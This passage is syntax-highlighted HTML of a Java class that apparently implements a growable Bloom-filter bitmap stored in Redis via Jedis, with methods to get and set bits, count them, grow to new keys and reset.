</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb56684974781-14\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb56684974781-15\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb56684974781-16\"> </div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb56684974781-17\"><span class=\"crayon-h\">   </span><span class=\"crayon-t\">boolean</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">get</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">long</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">offsets</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb56684974781-18\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">cursor</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb56684974781-19\"><span class=\"crayon-h\">            </span><span class=\"crayon-m\">final</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">cursor</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb56684974781-20\"><span class=\"crayon-h\">            </span><span class=\"crayon-c\">//只要有一个cursor对应的bitmap中，offsets全部命中，则表示可能存在</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb56684974781-21\"><span class=\"crayon-h\">            </span><span class=\"crayon-t\">boolean</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">match</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Arrays</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">stream</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">offsets</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">boxed</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb56684974781-22\"><span class=\"crayon-h\">                    </span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">map</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">offset</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">jedisUtils</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">execute</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">jedis</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">jedis</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">getbit</span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">genkey</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">cursor</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">offset</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb56684974781-23\"><span class=\"crayon-h\">                    </span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">allMatch</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">b</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">Boolean</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">b</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb56684974781-24\"><span class=\"crayon-h\">            </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">match</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb56684974781-25\"><span class=\"crayon-h\">                </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">true</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb56684974781-26\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb56684974781-27\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb56684974781-28\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb56684974781-29\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb56684974781-30\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">boolean</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">get</span><span class=\"crayon-sy\">(</span><span class=\"crayon-m\">final</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">offset</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb56684974781-31\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">jedisUtils</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">execute</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">jedis</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">jedis</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">getbit</span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">currentKey</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">offset</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb56684974781-32\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb56684974781-33\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb56684974781-34\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">boolean</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">set</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">long</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">offsets</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb56684974781-35\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">cursor</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;&amp;</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">get</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">offsets</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb56684974781-36\"><span class=\"crayon-h\">            </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb56684974781-37\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb56684974781-38\"><span class=\"crayon-h\">        </span><span class=\"crayon-t\">boolean</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">bitsChanged</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb56684974781-39\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">offset</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">offsets</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb56684974781-40\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">bitsChanged</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">set</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">offset</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb56684974781-41\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">bitsChanged</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb56684974781-42\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb56684974781-43\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb56684974781-44\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">boolean</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">set</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">offset</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb56684974781-45\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-o\">!</span><span class=\"crayon-e\">get</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">offset</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb56684974781-46\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">jedisUtils</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">execute</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">jedis</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">jedis</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">setbit</span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">currentKey</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">offset</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">true</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb56684974781-47\"><span class=\"crayon-h\">            </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">true</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb56684974781-48\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb56684974781-49\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb56684974781-50\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb56684974781-51\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb56684974781-52\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">bitCount</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb56684974781-53\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">jedisUtils</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">execute</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">jedis</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">jedis</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">bitcount</span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">currentKey</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb56684974781-54\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb56684974781-55\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb56684974781-56\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">bitSize</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb56684974781-57\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">this</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">bitSize</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb56684974781-58\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb56684974781-59\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb56684974781-60\"><span class=\"crayon-h\">    </span><span class=\"crayon-m\">private</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">String</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">currentKey</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb56684974781-61\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">genkey</span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">cursor</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb56684974781-62\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb56684974781-63\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb56684974781-64\"><span class=\"crayon-h\">    </span><span class=\"crayon-m\">private</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">String</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">genkey</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">cursor</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb56684974781-65\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">BASE_KEY</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"-\"</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">cursor</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb56684974781-66\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb56684974781-67\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb56684974781-68\"><span class=\"crayon-h\">    </span><span class=\"crayon-m\">private</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">Long</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">cursor</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb56684974781-69\"><span class=\"crayon-h\">        </span><span class=\"crayon-t\">String</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">cursor</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">jedisUtils</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">execute</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">jedis</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">jedis</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">get</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">CURSOR</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb56684974781-70\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">cursor</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">==</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">null</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">?</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Longs</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">tryParse</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">cursor</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb56684974781-71\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb56684974781-72\"> </div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb56684974781-73\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">ensureCapacityInternal</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb56684974781-74\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">bitCount</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">bitSize</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb56684974781-75\"><span class=\"crayon-h\">            </span><span class=\"crayon-e\">grow</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb56684974781-76\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb56684974781-77\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb56684974781-78\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">grow</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb56684974781-79\"><span class=\"crayon-h\">        </span><span class=\"crayon-t\">Long</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">cursor</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">jedisUtils</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">execute</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">jedis</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">jedis</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">incr</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">CURSOR</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb56684974781-80\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">jedisUtils</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">execute</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">jedis</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">jedis</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">setbit</span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">genkey</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">cursor</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">bitSize</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb56684974781-81\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb56684974781-82\"> </div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb56684974781-83\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">reset</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb56684974781-84\"><span class=\"crayon-h\">        </span><span class=\"crayon-t\">String</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">keys</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">LongStream</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">range</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">cursor</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">boxed</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">map</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">this</span><span class=\"crayon-o\">::</span><span class=\"crayon-v\">genkey</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">toArray</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">String</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-o\">::</span><span class=\"crayon-v\">new</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb56684974781-85\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">jedisUtils</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">execute</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">jedis</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">jedis</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">del</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">keys</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb56684974781-86\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">jedisUtils</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">execute</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">jedis</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">jedis</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">set</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">CURSOR</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"0\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb56684974781-87\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">jedisUtils</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">execute</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">jedis</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">jedis</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">setbit</span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">currentKey</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">bitSize</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span 